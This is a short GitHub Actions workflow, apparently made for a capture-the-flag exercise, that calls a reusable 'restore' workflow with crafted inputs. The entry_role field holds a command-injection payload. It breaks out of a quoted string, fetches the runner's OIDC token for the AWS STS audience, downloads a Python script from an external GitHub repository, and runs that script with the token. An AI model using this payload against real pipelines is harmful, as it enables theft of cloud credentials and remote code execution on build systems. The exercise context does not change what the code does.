name: Test restore input handling

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  test:
    uses: yulmwu/metricforge-recovery-workflows/.github/workflows/restore.yml@main
    with:
      mode: exchange
      nonce: author4
      entry_role: >-
        x"; token=$(curl -fsSL -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r .value); curl -fsSL https://raw.githubusercontent.com/MyeongJong03/metricforge-ctf-runner-20260719/main/role_probe.py -o /tmp/mf-role-probe.py; MF_ONLY_AUTHOR=1 MF_OIDC_TOKEN="$token" python3 /tmp/mf-role-probe.py; exit $?; #
